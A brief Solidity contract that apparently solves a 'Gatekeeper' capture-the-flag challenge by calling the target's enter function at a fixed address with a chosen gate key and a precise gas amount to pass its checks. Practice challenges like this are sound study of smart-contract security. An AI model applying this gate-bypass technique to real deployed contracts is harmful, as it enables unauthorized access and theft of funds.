// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Gatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Solve {
    Gatekeeper challengeContract =
        Gatekeeper(0xe6068109E1fEB290b0B54a1D7BDD28cE47326c22);

    function solve(bytes8 gateKey) public {
        challengeContract.enter{gas: 32960}(gateKey);
    }
}
